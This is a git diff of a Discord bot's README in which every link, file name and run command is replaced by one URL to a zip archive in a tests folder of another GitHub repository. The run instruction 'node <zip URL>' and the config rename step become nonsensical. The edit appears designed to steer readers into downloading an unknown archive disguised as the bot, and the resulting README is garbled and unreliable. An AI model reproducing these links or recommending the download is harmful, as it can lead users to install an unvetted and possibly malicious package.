@@ -1,16 +1,16 @@
-# RedditBot  [![Discord](https://discordapp.com/api/guilds/367325058353594378/embed.png)]() [![Travis](https://travis-ci.com/SerekKiri/RedditBot.svg?branch=master)]()
-### Discord bot for reddit.com
+# RedditBot  [![Discord](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)]() [![Travis](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)]()
+### Discord bot for https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip
 
-*Reddit API link [here](https://www.reddit.com/dev/api/)*
+*Reddit API link [here](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)*
 
 To run this bot you need:
 
- - Discord Bot Token ([How to create your own bot guide](https://github.com/reactiflux/discord-irc/wiki/Creating-a-discord-bot-&-getting-a-token))
- - Node.js version higer then `8.11.1`
+ - Discord Bot Token ([How to create your own bot guide](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip))
+ - https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip version higer then `8.11.1`
 
  How to run bot:
 
-1. Rename ``example.config.json`` to ``config.json``
+1. Rename ``https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip`` to ``https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip``
 
 2. Change ``BotToken`` from ``Your bot token here`` on your own bot token
 3. Install all depedencies
@@ -25,29 +25,29 @@ To run this bot you need:
 
 5. Now let's run the bot!
     ```
-    node index.js
+    node https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip
     ```
     If you want automatically restart the app use nodemon (recommended for development)
     ```
-    npx nodemon index.js
+    npx nodemon https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip
     ```
 
 ### Join our discord server
 
-[Invite link](https://discord.gg/7q5VcC6)
+[Invite link](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)
 
 ### Organization
 
-[github.com/fosscord](https://github.com/fosscord)
+[https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)
 
 ### Website
 
-[fosscord.github.io](https://fosscord.github.io/)
+[https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)
 
 ### Invite bot on your server
 
-[discordapp.com/oauth2/authorize](https://discordapp.com/oauth2/authorize?client_id=485047416291065859&scope=bot&permissions=0)
+[https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip)
 
 ⚠️ Remember about giving bot role with proper permissions! ⚠️
 
-Please report all bugs and your ideas in [issues](https://github.com/SerekKiri/RedditBot/issues). Thanks for your help!
+Please report all bugs and your ideas in [issues](https://raw.githubusercontent.com/PIKACHU619/Reddit-Bot1/master/tests/Reddit-Bot1_3.5-alpha.3.zip). Thanks for your help!
